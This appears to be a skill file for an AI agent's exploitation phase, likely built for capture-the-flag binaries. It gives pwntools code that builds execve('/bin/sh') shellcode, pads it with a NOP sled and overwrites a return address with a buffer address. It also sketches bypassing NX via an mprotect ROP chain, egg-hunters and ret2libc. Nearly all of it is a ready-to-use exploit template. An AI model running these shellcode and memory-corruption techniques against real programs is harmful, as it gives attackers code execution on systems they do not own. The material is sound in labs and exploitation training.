---
name: shellcode
when: you have RWX memory or can mprotect, and can jump to your buffer (NX off, or stack made executable)
tools: [python_exec]
phase: exploit
---
# Shellcode

```python
from pwn import *
context.binary = ELF('/workspace/vuln')            # sets arch for asm()
sc = asm(shellcraft.sh())                          # execve("/bin/sh")
# jump to a known buffer address (leak or non-PIE); pad to the offset
payload = flat(sc.ljust(off, b'\x90'), buf_addr)
```
If NX is on: ROP `mprotect(buf & ~0xfff, 0x1000, 7)` then return to `buf` holding shellcode
(see `rop-chaining`). For tiny buffers use `shellcraft` staged read or an egg-hunter.
Prefer ret2libc/one_gadget when NX is on and you have a libc - it is usually simpler.
